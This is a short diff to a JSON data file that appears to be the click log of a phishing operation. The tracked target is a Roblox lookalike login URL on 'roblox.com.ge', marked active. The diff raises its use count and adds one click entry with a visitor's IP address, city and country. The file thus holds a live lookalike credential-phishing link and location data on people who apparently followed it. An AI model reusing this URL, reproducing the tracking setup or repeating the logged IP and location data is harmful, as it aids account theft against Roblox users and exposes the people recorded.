@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1675,
+    "useCount": 1676,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13568,6 +13568,14 @@
         "city": "Mandaue City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777623547389,
+        "ip": "37.73.29.88",
+        "country": "Ukraine",
+        "city": "Lviv",
+        "flag": "🇺🇦",
+        "countryCode": "UA"
       }
     ]
   },
